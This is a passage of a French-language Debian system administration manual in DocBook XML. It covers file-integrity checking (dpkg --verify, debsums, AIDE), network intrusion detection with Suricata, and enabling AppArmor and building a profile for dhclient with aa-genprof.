	<para>Ce livre traite en détail de Munin (voir <xref linkend="sect.munin" />) dans le cadre du <xref linkend="advanced-administration" />. Debian dispose également de <emphasis role="pkg">cacti</emphasis>. Il est un peu plus complexe à mettre en œuvre : l'usage de SNMP est inévitable et malgré une interface web, les concepts de configuration restent difficiles à appréhender. La lecture de la documentation HTML (<filename>/usr/share/doc/cacti/html/index.html</filename>) sera indispensable si l'on souhaite le mettre en œuvre.</para>

        <sidebar>
          <title><emphasis>ALTERNATIVE</emphasis> <command>mrtg</command></title>
          <indexterm><primary><command>mrtg</command></primary></indexterm>

	  <para><command>mrtg</command> (du paquet Debian éponyme) est un outil plus ancien et plus rustique capable d'agréger des données historiques et d'en faire des graphiques. Il dispose d'un certain nombre de scripts de récupération des données les plus couramment surveillées : charge, trafic réseau, impacts <foreignphrase>(hits)</foreignphrase> web, etc.</para>

	  <para>Les paquets <emphasis role="pkg">mrtg-contrib</emphasis> et <emphasis role="pkg">mrtgutils</emphasis> contiennent des scripts d'exemples, prêts à l'emploi.</para>
        </sidebar>
      </section>
    </section>
    <section>
      <title>Détection des changements</title>

      <para>Une fois le système installé et configuré, l'état de la majorité des fichiers et répertoires (hors données) n'a pas de raison d'évoluer (sauf mises à jour de sécurité). Il est donc intéressant de s'assurer que c'est bien le cas : tout changement inattendu est alors suspect. Les outils présentés dans cette section permettent de surveiller tous les fichiers et de prévenir les administrateurs en cas d'altération inattendue, ou alors simplement de diagnostiquer l'étendue des altérations.</para>
      <section id="sect.dpkg-verify">
        <title>Audit des paquets avec <command>dpkg --verify</command></title>
        <indexterm><primary><command>dpkg</command></primary><secondary><command>dpkg --verify</command></secondary></indexterm>
        <sidebar>
          <title><emphasis>POUR ALLER PLUS LOIN</emphasis> Se protéger des modifications en amont</title>

	  <para><command>dpkg --verify</command> peut être utilisé pour détecter les changements effectués sur les fichiers provenant d'un paquet Debian. Mais si le paquet Debian lui-même est compromis, il ne sera d'aucune utilité. Cela pourrait être le cas si le miroir Debian employé est lui-même compromis. Pour se protéger de ces attaques, il faut s'appuyer sur le mécanisme de vérification de signatures numériques intégré à APT (voir <xref linkend="sect.package-authentication" />) et prendre soin de n'installer que des paquets dont l'origine a pu être certifiée.</para>
        </sidebar>

        <para><command>dpkg --verify</command> (ou <command>dpkg -V</command>) est un outil intéressant qui permet de trouver quels fichiers installés ont été modifiés (potentiellement par un attaquant), mais cette information est à prendre avec précaution. Pour faire son travail, dpkg utilise les sommes de contrôle stockée dans sa propre base de données, qui est elle-même stockée sur le disque dur (dans le fichier <filename>/var/lib/dpkg/info/<replaceable>paquet</replaceable>.md5sums</filename>) ; un attaquant minutieux pourra donc mettre à jour ces fichiers pour qu'ils correspondent aux nouvelles sommes de contrôle des fichiers corrompus.</para>

        <sidebar>
          <title><emphasis>B.A.-BA</emphasis> Empreinte d'un fichier</title>
	  <indexterm><primary>empreinte</primary></indexterm>
	  <indexterm><primary>somme de contrôle</primary></indexterm>
	  <indexterm><primary>MD5</primary></indexterm>
	  <indexterm><primary>SHA1</primary></indexterm> 
          <para>Rappelons qu'une empreinte est une valeur, généralement numérique (même si elle est codée en hexadécimal), constituant une sorte de signature caractéristique du contenu d'un fichier. Elle est calculée au moyen d'algorithmes (les plus connus étant MD5 et SHA1) qui garantissent dans la pratique que (presque) toute modification du fichier, aussi minime soit-elle, entraînera un changement de l'empreinte ; c'est l'« effet d'avalanche ». C'est pourquoi une empreinte numérique sert à vérifier que le contenu d'un fichier n'a pas été altéré. Ces algorithmes ne sont pas réversibles, c'est-à-dire que pour la plupart d'entre eux, il est impossible de retrouver un contenu inconnu à partir de la seule empreinte. De récentes découvertes scientifiques tendent à infirmer l'inviolabilité de ces principes, mais cela ne remet pas encore en cause leur usage puisque la création de contenus différents générant la même empreinte semble être très contraignante.</para>
        </sidebar>

        <para>La commande <command>dpkg -V</command> vérifie tous les paquets installés, et affiche une ligne pour chaque fichier qui échoue au test d'intégrité. Le format de sortie est le même que celui de <command>rpm -V</command>, où chaque caractère correspond à un test sur une métadonnée spécifique.  Malheureusement, <command>dpkg</command> ne stocke pas toutes les métadonnées requises pour tous les tests, et n'affichera donc que des points d'interrogation pour la plupart. À l'heure actuelle, seul le test de somme de contrôle peut afficher un « 5 » (en troisième colonne) en cas d'échec.</para>
        <screen>
<computeroutput># </computeroutput><userinput>dpkg -V</userinput>
<computeroutput>??5??????   /lib/systemd/system/ssh.service
??5?????? c /etc/libvirt/qemu/networks/default.xml
??5?????? c /etc/lvm/lvm.conf
??5?????? c /etc/salt/roster</computeroutput></screen>
        <para>Dans l'exemple ci-dessus, dpkg signale un changement dans le fichier de service de SSH que l'administrateur a effectué dans le fichier du paquet au lieu de modifier la configuration avec un fichier <filename>/etc/systemd/system/ssh.service</filename> (stocké dans <filename>/etc</filename> comme tout fichier de configuration qui se respecte). dpkg liste également plusieurs fichiers de configuration (identifiés par la lettre « c » du deuxième champ) qui ont été (légitimement) modifiés.</para>
      </section>

      <section id="sect.debsums">
        <title>Audit des paquets : l'outil <command>debsums</command> et ses limites</title>
        <indexterm><primary><command>debsums</command></primary></indexterm>

        <para><command>debsums</command> est l'ancêtre de <command>dpkg -V</command>, et ce dernier l'a rendu quasiment obsolète. Il souffre des mêmes restrictions que dpkg. Heureusement, il est possible de passer outre une partie de ces restrictions (ce que ne permet pas dpkg).</para>

        <para>Comme il n'est pas possible de faire confiance aux fichiers stockés sur le disque, <command>debsums</command> permet d'effectuer ses vérifications à partir de fichiers <filename>.deb</filename> plutôt qu'à partir de la base de données de dpkg. Pour télécharger les fichiers <filename>.deb</filename> de confiance de tous les paquets installés, on peut utiliser les téléchargements authentifiés d'APT. Mais cette opération peut être longue et pénible, et n'est donc pas à envisager dans le cadre d'une technique proactive à utiliser de manière routinière.</para>

        <screen>
<computeroutput># </computeroutput><userinput>apt-get --reinstall -d install `grep-status -e 'Status: install ok installed' -n -s Package`</userinput>
<computeroutput>[ ... ]
# </computeroutput><userinput>debsums -p /var/cache/apt/archives --generate=all</userinput></screen>

	<para>Attention, cet exemple a employé la commande <command>grep-status</command> du paquet <emphasis role="pkg">dctrl-tools</emphasis>, qui n'est pas installé en standard.</para>
      </section>
      <section>
        <title>Surveillance des fichiers : AIDE</title>
        <indexterm><primary><emphasis role="pkg">aide</emphasis> (paquet Debian)</primary></indexterm>

	<para>AIDE <foreignphrase>(Advanced Intrusion Detection Environment)</foreignphrase> est un outil qui sert à vérifier l'intégrité des fichiers et à détecter toute altération par rapport à une image du système préalablement enregistrée et validée. Cette dernière prend la forme d'une base de données (<filename>/var/lib/aide/aide.db</filename>) contenant les caractéristiques de tous les fichiers du système (permissions, horodatages, empreintes numériques, etc.). Cette base de données est initialisée une première fois par <command>aideinit</command> ; elle est ensuite employée pour vérifier quotidiennement (script <filename>/etc/cron.daily/aide</filename>) que rien n'a changé. Si des changements sont détectés, le logiciel les enregistre dans des fichiers de journalisation (<filename>/var/log/aide/*.log</filename>) et envoie un courrier à l'administrateur avec ses découvertes.</para>

        <sidebar>
          <title><emphasis>EN PRATIQUE</emphasis> Protection de la base de données</title>

	  <para>Puisque AIDE utilise une base de données pour comparer l'état des fichiers, il faut être conscient que la validité des résultats fournis dépend de la validité de la base de données. Sur un système compromis, un attaquant obtenant les droits <literal>root</literal> pourra remplacer la base de données et passer inaperçu. C'est pourquoi, pour plus de sécurité, il peut être intéressant de stocker la base de données de référence sur un support accessible en lecture seulement.</para>
        </sidebar>

	<para>Le comportement du paquet <emphasis role="pkg">aide</emphasis> se paramètre grâce à de nombreuses options dans <filename>/etc/default/aide</filename>. La configuration du logiciel proprement dit se trouve dans <filename>/etc/aide/aide.conf</filename> et <filename>/etc/aide/aide.conf.d/</filename> (en réalité, ces fichiers servent de base à <command>update-aide.conf</command> pour créer <filename>/var/lib/aide/aide.conf.autogenerated</filename>). La configuration indique quelles propriétés de chaque fichier il faut vérifier. Ainsi, le contenu des fichiers de logs peut varier tant que les permissions associées ne varient pas, mais le contenu et les permissions d'un exécutable doivent être fixes. La syntaxe n'est pas très compliquée, mais elle n'est pas forcément intuitive pour autant. La lecture de la page de manuel <citerefentry><refentrytitle>aide.conf</refentrytitle><manvolnum>5</manvolnum></citerefentry> est donc bénéfique.</para>

	<para>Une nouvelle version de la base de données est générée chaque jour dans <filename>/var/lib/aide/aide.db.new</filename> et peut être utilisée pour remplacer la base officielle si tous les changements constatés étaient légitimes.</para>

        <sidebar>
          <title><emphasis>ALTERNATIVE</emphasis> Tripwire et Samhain</title>

	  <para>Tripwire est très similaire à AIDE ; la syntaxe de son fichier de configuration est quasiment identique. Le paquet <emphasis role="pkg">tripwire</emphasis> propose en outre un mécanisme de signature du fichier de configuration afin qu'un attaquant ne puisse pas le changer pour le faire pointer vers une version différente de la base de données.</para>

	  <para>Samhain offre des fonctionnalités similaires ainsi qu'un certain nombre de fonctions pour détecter la présence de <foreignphrase>rootkits</foreignphrase> (voir <xref linkend="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages" />). En outre, il peut être employé sur tout un réseau et enregistrer ses traces sur un serveur central après les avoir signées.</para>
        </sidebar>

        <sidebar id="sidebar.the-checksecurity-and-chkrootkit-rkhunter-packages">
          <title><emphasis>DÉCOUVERTE</emphasis> Les paquets <emphasis role="pkg">checksecurity</emphasis> et <emphasis role="pkg">chkrootkit</emphasis>/<emphasis role="pkg">rkhunter</emphasis></title>
          <indexterm><primary><emphasis role="pkg">checksecurity</emphasis></primary></indexterm>

	  <para>Le premier paquet contient plusieurs petits scripts qui effectuent des vérifications de base sur le système (mot de passe vide, détection de nouveaux fichiers setuid, etc.) et alertent l'administrateur si nécessaire. Malgré son nom explicite, il ne faut pas se fier seulement à ce paquet pour vérifier la sécurité d'un système Linux.</para>

	  <para>Les paquets <emphasis role="pkg">chkrootkit</emphasis> et <emphasis role="pkg">rkhunter</emphasis> recherchent de potentiels <foreignphrase>rootkits</foreignphrase> installés sur le système. Rappelons qu'il s'agit de logiciels destinés à dissimuler la compromission d'un système et à conserver un contrôle discret sur la machine. Les tests ne sont pas fiables à 100 %, mais ils permettent tout de même d'attirer l'attention de l'administrateur sur des problèmes potentiels.</para>
        </sidebar>
      </section>
    </section>
    <section id="sect.intrusion-detection">
      <title>Détection d'intrusion (IDS/NIDS)</title>
      <indexterm><primary>intrusion, détection de</primary></indexterm>
      <indexterm><primary>détection d'intrusion</primary></indexterm>
      <indexterm><primary>IDS</primary></indexterm>
      <indexterm><primary><foreignphrase>Intrusion Detection System</foreignphrase></primary></indexterm>
      <indexterm><primary>NIDS</primary></indexterm>
      <indexterm><primary><foreignphrase>Network</foreignphrase></primary><secondary><foreignphrase>IDS</foreignphrase></secondary></indexterm>

      <sidebar>
        <title><emphasis>B.A.-BA</emphasis> Dénis de service</title>
        <indexterm><primary>dénis de service</primary></indexterm>

	<para>Une attaque de type « déni de service » a pour seul objectif de rendre un service réseau inexploitable. Que cela soit en surchargeant le serveur de requêtes ou en exploitant un bogue de celui-ci, le résultat est toujours le même : le service en question n'est plus fonctionnel, les utilisateurs habituels sont mécontents et l'hébergeur du service réseau visé s'est fait une mauvaise publicité (en plus d'avoir éventuellement perdu des ventes, s'il s'agit par exemple d'un site de commerce en ligne).</para>

	<para>Une telle attaque est parfois « distribuée », il s'agit alors de surcharger la machine avec un grand nombre de requêtes en provenance de nombreuses sources, afin que le serveur ne puisse plus répondre aux requêtes légitimes. En anglais, on parle de <foreignphrase>(distributed) denial of service</foreignphrase> (abrégé en <acronym>DoS</acronym> ou <acronym>DDoS</acronym>).</para>
      </sidebar>

      <para><command>suricata</command> (du paquet Debian éponyme) est un outil de détection d'intrusions (NIDS — <foreignphrase>Network Intrusion Detection System</foreignphrase>) : il écoute en permanence le réseau pour repérer les tentatives d'infiltration et/ou les actes malveillants (notamment les dénis de service). Tous ces événements sont enregistrés dans des fichiers stockés dans <filename>/var/log/suricata</filename>. Des outils tiers (Kibana/Logstash) permettent de naviguer de manière pratique dans les données collectées. <ulink type="block" url="http://suricata-ids.org" /> <ulink type="block" url="https://www.elastic.co/products/kibana" /></para>
      <indexterm><primary><command>snort</command></primary></indexterm>
      <indexterm><primary><command>suricata</command></primary></indexterm>

      <sidebar>
        <title><emphasis>ATTENTION</emphasis> Rayon d'action</title>

	<para><command>suricata</command> est limité par le trafic qu'il voit transiter sur son interface réseau : il ne pourra évidemment rien détecter s'il n'observe rien. Branché sur un commutateur <foreignphrase>(switch)</foreignphrase>, il ne surveillera que les attaques ciblant la machine l'hébergeant, ce qui n'a qu'un intérêt assez limité. Pensez donc à relier la machine employant <command>suricata</command> au port « miroir », qui permet habituellement de chaîner les commutateurs et sur lequel tout le trafic est dupliqué.</para>
      </sidebar>

      <para>La configuration de Suricata se fait par le biais du fichier <filename>/etc/suricata/suricata-debian.yaml</filename>, qui est très long puisque chaque paramètre y est abondamment décrit. A minima, il faudra configurer la plage d'adresses couverte par le réseau local (le paramètre <literal>HOME_NET</literal>). En pratique, il s'agit de l'ensemble de toutes les cibles d'attaques potentielles. Mais pour tirer le meilleur parti de l'outil, il faudra lire ce fichier dans son intégralité et l'adapter au mieux à la situation locale.</para>
      <para>Il faudra également modifier <filename>/etc/default/suricata</filename> pour y déclarer l'interface réseau à superviser, et y activer le script d'initialisation (en réglant <literal>RUN=yes</literal>). On pourra aussi régler <literal>LISTENMODE=pcap</literal>, parce que la valeur par défaut (<literal>nfqueue</literal>) ne fonctionne pas sans une configuration supplémentaire (le pare-feu netfilter doit être configuré pour passer les paquets à une file d'attente en espace utilisateur gérée par Suricata, via la cible <literal>NFQUEUE</literal>).</para>
      <para><command>suricata</command> détecte les comportements anormaux sur la foi d'un ensemble de règles de supervision. Un ensemble de ces règles est disponible dans le paquet <emphasis role="pkg">snort-rules-default</emphasis>. <command>snort</command> est la référence de l'écosystème IDS, et <command>suricata</command> peut réutiliser les règles écrites pour <command>snort</command>. Malheureusement, ce paquet n'est pas disponible dans Debian <emphasis role="distribution">Jessie</emphasis>, et il faudra se le procurer depuis une autre version de Debian, comme <emphasis role="distribution">Testing</emphasis> ou <emphasis role="distribution">Unstable</emphasis>.</para>
      <para>Une autre possibilité est d'utiliser <command>oinkmaster</command> (dans le paquet du même nom), qui est capable de télécharger des ensembles de règles Snort depuis des sources externes.</para>
      <sidebar>
        <title><emphasis>POUR ALLER PLUS LOIN</emphasis> Intégration avec <command>prelude</command></title>

	<para>Prelude offre une supervision centralisée des informations de sécurité. Pour cela, il dispose d'une architecture modulaire : un serveur (le <foreignphrase>manager</foreignphrase> du paquet <emphasis>prelude-manager</emphasis>) centralise les alertes détectées par des capteurs <foreignphrase>(sensors)</foreignphrase> de plusieurs types.</para>

	<para>Suricata peut être configuré comme un de ces capteurs. Il existe aussi <emphasis>prelude-lml</emphasis> (<foreignphrase>Log Monitor Lackey</foreignphrase>, ou laquais de surveillance de journaux système) qui surveille quant à lui les fichiers de <emphasis>logs</emphasis>, à l'instar de <command>logcheck</command> (voir <xref linkend="sect.logcheck" />), déjà étudié.</para>
        <indexterm><primary><command>prelude</command></primary></indexterm>
      </sidebar>
    </section>
  </section>
  <section id="sect.apparmor">
    <title>Introduction à AppArmor</title>
    <indexterm><primary>AppArmor</primary></indexterm>
    <section id="sect.apparmor-principles">
      <title>Les principes</title>
      <para>AppArmor est un système de contrôle d'accès obligatoire <foreignphrase>(Mandatory Access Control)</foreignphrase> qui s'appuie sur l'interface <foreignphrase>Linux Security Modules</foreignphrase> fournie par le noyau Linux. Concrètement, le noyau interroge AppArmor avant chaque appel système pour savoir si le processus est autorisé à effectuer l'opération concernée. Ce mécanisme permet à AppArmor de confiner des programmes à un ensemble restreint de ressources.</para>
      <indexterm><primary><emphasis>Mandatory Access Control</emphasis></primary></indexterm>
      <indexterm><primary><emphasis>Linux Security Modules</emphasis></primary></indexterm>
      <para>AppArmor applique un ensemble de règles (un « profil ») à chaque programme. Le profil appliqué par le noyau dépend du chemin d'installation du programme à exécuter. Contrairement à SELinux (décrit dans <xref linkend="sect.selinux" />), les règles appliquées ne dépendent pas de l'utilisateur : tous les utilisateurs sont concernés par le même jeu de règles lorsqu'ils exécutent le même programme (mais les permissions habituelles des utilisateurs jouent toujours, ce qui peut donner un comportement différent).</para>
      <para>Les profils AppArmor sont stockés dans <filename>/etc/apparmor.d/</filename> ; ils consistent en une liste de règles de contrôle d'accès sur les ressources que peut utiliser chaque programme. Les profils sont compilés et chargés dans le noyau par le biais de la commande <command>apparmor_parser</command>. Chaque profil peut être chargé soit en mode strict <foreignphrase>(enforcing)</foreignphrase> soit en mode relâché <foreignphrase>(complaining)</foreignphrase>. Le mode strict applique les règles et rapporte les tentatives de violation, alors que le mode relâché se contente d'enregistrer dans les journaux système les appels système qui auraient été bloqués, sans les bloquer réellement.</para>
    </section>
    <section id="sect.apparmor-setup">
      <title>Activer AppArmor et gérer les profils</title>
      <para>Le support d'AppArmor est intégré aux noyaux standards fournis par Debian. Pour activer AppArmor, il suffira donc d'installer quelques paquets et d'ajouter quelques paramètres à la ligne de commande du noyau :</para>
      <screen><computeroutput># </computeroutput><userinput>apt install apparmor apparmor-profiles apparmor-utils
</userinput><computeroutput>[...]
# </computeroutput><userinput>perl -pi -e 's,GRUB_CMDLINE_LINUX="(.*)"$,GRUB_CMDLINE_LINUX="$1 apparmor=1 security=apparmor",' /etc/default/grub
</userinput><computeroutput># </computeroutput><userinput>update-grub
</userinput></screen>
      <para>Après un redémarrage, AppArmor sera opérationnel, ce que confirmera <command>aa-status</command> :</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-status</userinput>
<computeroutput>apparmor module is loaded.
44 profiles are loaded.
9 profiles are in enforce mode.
   /usr/bin/lxc-start
   /usr/lib/chromium-browser/chromium-browser//browser_java
[...]
35 profiles are in complain mode.
   /sbin/klogd
[...]
3 processes have profiles defined.
1 processes are in enforce mode.
   /usr/sbin/libvirtd (1295) 
2 processes are in complain mode.
   /usr/sbin/avahi-daemon (941) 
   /usr/sbin/avahi-daemon (1000) 
0 processes are unconfined but have a profile defined.</computeroutput></screen>
      <sidebar>
        <title><emphasis>NOTE</emphasis> Autres profils AppArmor</title>
        <para>Le paquet <emphasis role="pkg">apparmor-profiles</emphasis> contient des profils développés par la communauté amont d'AppArmor. Pour en obtenir d'autres encore, il est possible d'installer <emphasis role="pkg">apparmor-profiles-extra</emphasis>, qui contient des profils développés par Ubuntu et Debian.</para>
      </sidebar>
      <para>Le statut de chaque profil peut être basculé entre les modes strict et relâché, avec les commandes <command>aa-enforce</command> et <command>aa-complain</command>, en leur passant en paramètre soit le chemin de l'exécutable concerné, soit le chemin du fichier de profil. Il est également possible de désactiver complètement un profil avec <command>aa-disable</command>, ou de le basculer en mode audit (de sorte qu'il enregistre dans les journaux même les appels système acceptés) avec <command>aa-audit</command>.</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-enforce /usr/sbin/avahi-daemon</userinput>
<computeroutput>Setting /usr/sbin/avahi-daemon to enforce mode.</computeroutput>
<computeroutput># </computeroutput><userinput>aa-complain /etc/apparmor.d/usr.bin.lxc-start</userinput>
<computeroutput>Setting /etc/apparmor.d/usr.bin.lxc-start to complain mode.</computeroutput>
      </screen>
    </section>
    <section id="sect.apparmor-new-profile">
      <title>Créer un nouveau profil</title>
      <para>Bien qu'il soit assez simple de créer un profil AppArmor, peu de programmes en fournissent un. Cette section montre comment créer un nouveau profil depuis zéro, simplement en utilisant le programme visé et en indiquant à AppArmor de surveiller les appels système qu'il passe et les ressources qu'il utilise.</para>
      <para>Les programmes qui devront être confinés en priorité sont ceux qui font face au réseau, car ce sont eux qui seront les cibles les plus alléchantes pour des attaquants distants. C'est précisément dans ce but qu'AppArmor fournit une commande <command>aa-unconfined</command>, qui liste les programmes qui, sans avoir de profil associé, exposent quand même un port de communication. L'option <literal>--paranoid</literal> liste même tous les processus non confinés qui ont au moins une connexion réseau ouverte.</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-unconfined</userinput>
<computeroutput>801 /sbin/dhclient not confined
890 /sbin/rpcbind not confined
899 /sbin/rpc.statd not confined
929 /usr/sbin/sshd not confined
941 /usr/sbin/avahi-daemon confined by '/usr/sbin/avahi-daemon (complain)'
988 /usr/sbin/minissdpd not confined
1276 /usr/sbin/exim4 not confined
1485 /usr/lib/erlang/erts-6.2/bin/epmd not confined
1751 /usr/lib/erlang/erts-6.2/bin/beam.smp not confined
19592 /usr/lib/dleyna-renderer/dleyna-renderer-service not confined</computeroutput>
      </screen>
      <para>Dans l'exemple suivant, nous allons nous atteler à créer un profil pour <command>/sbin/dhclient</command>. Nous allons pour cela utiliser la commande <command>aa-genprof dhclient</command>, qui nous invite à utiliser l'application (dans une autre fenêtre) et à revenir à <command>aa-genprof</command> une fois que c'est fait, pour scruter les journaux à la recherche d'événements AppArmor et convertir ces journaux en règles de contrôle d'accès. Pour chaque événement enregistré, une ou plusieurs suggestions de règles seront proposées, et il sera possible de les approuver telles quelles ou de les modifier de diverses manières :</para>
      <screen>
<computeroutput># </computeroutput><userinput>aa-genprof dhclient</userinput>
<computeroutput>Writing updated profile for /sbin/dhclient.
Setting /sbin/dhclient to complain mode.

Before you begin, you may wish to check if a
profile already exists for the application you
wish to confine. See the following wiki page for
more information:
http://wiki.apparmor.net/index.php/Profiles

Please start the application to be profiled in
another window and exercise its functionality now.

Once completed, select the "Scan" option below in 
order to scan the system logs for AppArmor events. 

For each AppArmor event, you will be given the 
opportunity to choose whether the access should be 
allowed or denied.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
Reading log entries from /var/log/audit/audit.log.

Profile:  /sbin/dhclient <co id="aa-genprof-execute"></co>
Execute:  /usr/lib/NetworkManager/nm-dhcp-helper
Severity: unknown

(I)nherit / (C)hild / (P)rofile / (N)amed / (U)nconfined / (X) ix On / (D)eny / Abo(r)t / (F)inish
<userinput>P</userinput>
Should AppArmor sanitise the environment when
switching profiles?

Sanitising environment is more secure,
but some applications depend on the presence
of LD_PRELOAD or LD_LIBRARY_PATH.

(Y)es / [(N)o]
<userinput>Y</userinput>
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.
Complain-mode changes:
WARN: unknown capability: CAP_net_raw

Profile:    /sbin/dhclient <co id="aa-genprof-capability"></co>
Capability: net_raw
Severity:   unknown

[(A)llow] / (D)eny / (I)gnore / Audi(t) / Abo(r)t / (F)inish
<userinput>A</userinput>
Adding capability net_raw to profile.

Profile:  /sbin/dhclient <co id="aa-genprof-read"></co>
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
  3 - #include &lt;abstractions/nameservice&gt; 
  4 - #include &lt;abstractions/totem&gt; 
 [5 - /etc/nsswitch.conf]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>3</userinput>

Profile:  /sbin/dhclient
Path:     /etc/nsswitch.conf
Mode:     r
Severity: unknown

  1 - #include &lt;abstractions/apache2-common&gt; 
  2 - #include &lt;abstractions/libvirt-qemu&gt; 
 [3 - #include &lt;abstractions/nameservice&gt;]
  4 - #include &lt;abstractions/totem&gt; 
  5 - /etc/nsswitch.conf 
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding #include &lt;abstractions/nameservice&gt; to profile.

Profile:  /sbin/dhclient
Path:     /proc/7252/net/dev
Mode:     r
Severity: 6

  1 - /proc/7252/net/dev 
 [2 - /proc/*/net/dev]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/*/net/dev r to profile

[...]
Profile:  /sbin/dhclient <co id="aa-genprof-write"></co>
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

 [1 - /run/dhclient-eth0.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>N</userinput>

Enter new path: /run/dhclient*.pid

Profile:  /sbin/dhclient
Path:     /run/dhclient-eth0.pid
Mode:     w
Severity: unknown

  1 - /run/dhclient-eth0.pid 
 [2 - /run/dhclient*.pid]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /run/dhclient*.pid w to profile

[...]
Profile:  /usr/lib/NetworkManager/nm-dhcp-helper <co id="aa-genprof-other-profile"></co>
Path:     /proc/filesystems
Mode:     r
Severity: 6

 [1 - /proc/filesystems]
[(A)llow] / (D)eny / (I)gnore / (G)lob / Glob with (E)xtension / (N)ew / Abo(r)t / (F)inish / (M)ore
<userinput>A</userinput>
Adding /proc/filesystems r to profile

= Changed Local Profiles =

The following local profiles were changed. Would you like to save them?

 [1 - /sbin/dhclient]
  2 - /usr/lib/NetworkManager/nm-dhcp-helper 
(S)ave Changes / Save Selec(t)ed Profile / [(V)iew Changes] / View Changes b/w (C)lean profiles / Abo(r)t
<userinput>S</userinput>
Writing updated profile for /sbin/dhclient.
Writing updated profile for /usr/lib/NetworkManager/nm-dhcp-helper.

Profiling: /sbin/dhclient

[(S)can system log for AppArmor events] / (F)inish
<userinput>F</userinput>
Setting /sbin/dhclient to enforce mode.
Setting /usr/lib/NetworkManager/nm-dhcp-helper to enforce mode.

Reloaded AppArmor profiles in enforce mode.

Please consider contributing your new profile!
See the following wiki page for more information:
http://wiki.apparmor.net/index.php/Profiles

Finished generating profile for /sbin/dhclient.</computeroutput></screen>
      <para>Il faut noter que le programme n'affiche pas les caractères de contrôle tapés ; nous les avons inclus dans la transcription ci-dessus pour clarifier les choses.</para>
      <calloutlist>
        <callout arearefs="aa-genprof-execute">
          <para>Le premier événement détecté est l'exécution d'un autre programme. Dans ce cas, plusieurs choix s'offrent à nous : on peut soit lancer le programme avec le profil du programme parent <foreignphrase>(Inherit)</foreignphrase>, soit le lancer avec un profil dédié (<foreignphrase>Profile</foreignphrase> et <foreignphrase>Name</foreignphrase>, qui ne diffèrent que par la possibilité de choisir un nom de profil arbitraire), soit le lancer avec un sous-profil du processus parent <foreignphrase>(Child)</foreignphrase>, soit le lancer sans aucun profil <foreignphrase>(Unconfined)</foreignphrase>, soit ne pas le lancer du tout <foreignphrase>(Deny)</foreignphrase>.</para>
          <para>À noter que lorsque l'on choisit de lancer le processus fils selon un profil dédié mais qui n'existe pas encore, l'outil va créer le profil manquant, et proposer des suggestions de règles par la même occasion.</para>
        </callout>
        <callout arearefs="aa-genprof-capability">
          <para>Au niveau du noyau, les pouvoirs spéciaux de l'utilisateur root ont été séparés en « capacités ». Lorsqu'un appel système a besoin d'une capacité spécifique, AppArmor va vérifier que le profil permet au programme d'utiliser cette capacité.</para>
        </callout>
        <callout arearefs="aa-genprof-read">
          <para>Ici, le programme requiert les permissions de lecture sur <filename>/etc/nsswitch.conf</filename>. <command>aa-genprof</command> a détecté que cette permission était déjà accordée par plusieurs « abstractions », et les offre comme des choix possibles. Une abstraction fournit un ensemble réutilisable de règles de contrôle d'accès, en regroupant des règles qui sont souvent utilisées de concert. Dans notre cas précis, ce fichier est généralement utilisé par les fonctions de la bibliothèque C standard liées à la résolution de noms, et nous choisissons donc « 3 » pour inclure le choix « #include &lt;abstractions/nameservice&gt; », puis « A » pour l'autoriser.</para>
        </callout>
        <callout arearefs="aa-genprof-write">
          <para>Le programme essaie de créer le fichier <filename>/run/dhclient-eth0.pid</filename>. Si nous autorisons seulement la création de ce fichier, le programme ne fonctionnera plus lorsque l'utilisateur essaiera de l'utiliser sur une autre interface réseau. Nous choisissons donc « New » pour remplacer le nom de fichier par un nom plus générique, « /run/dhclient*.pid », avant d'enregistrer la règle avec « Allow ».</para>
        </callout>
        <callout arearefs="aa-genprof-other-profile">
          <para>Notons que cette tentative d'accès ne fait pas partie du profil dhclient, mais du nouveau profil que nous avons créé lorsque nous avons autorisé <filename>/usr/lib/NetworkManager/nm-dhcp-helper</filename> à fonctionner sous son propre profil.</para>
          <para>Une fois que tous les événements enregistrés ont été examinés, le programme propose de sauver tous les profils qui ont été créés pendant l'exécution. Dans notre cas, nous avons deux profils que nous enregistrons d'un coup avec « Save » (mais nous aurions aussi pu les enregistrer un par un) avant de quitter le programme avec « Finish ».</para>
        </callout>
      </calloutlist>
      <para><command>aa-genprof</command> n'est en fait qu'un petit script intelligent qui utilise <command>aa-logprof</command> : il crée un profil vide, le charge en mode relâché, puis lance <command>aa-logprof</command>. Ce dernier est un outil qui met à jour un profil en fonction des violations qui ont été enregistrées. On peut donc relancer cet outil plus tard, de manière à améliorer le profil nouvellement créé.</para>
      <para>Pour que le profil généré soit complet, il faut utiliser le programme de toutes les manières légitimement possibles. Dans le cas de dhclient, cela implique de le lancer via Network Manager, mais aussi via ifupdown, à la main, etc. À la fin, on obtient un <filename>/etc/apparmor.d/sbin.dhclient</filename> qui ressemble à ceci :</para>
      <programlisting>
# Last Modified: Tue Sep  8 21:40:02 2015
#include &lt;tunables/global&gt;

/sbin/dhclient {
  #include &lt;abstractions/base&gt;
  #include &lt;abstractions/nameservice&gt;

  capability net_bind_service,
  capability net_raw,

  /bin/dash r,
  /etc/dhcp/* r,
  /etc/dhcp/dhclient-enter-hooks.d/* r,
  /etc/dhcp/dhclient-exit-hooks.d/* r,
  /etc/resolv.conf.* w,
  /etc/samba/dhcp.conf.* w,
  /proc/*/net/dev r,
  /proc/filesystems r,
  /run/dhclient*.pid w,
  /sbin/dhclient mr,
  /sbin/dhclient-script rCx,
  /usr/lib/NetworkManager/nm-dhcp-helper Px,
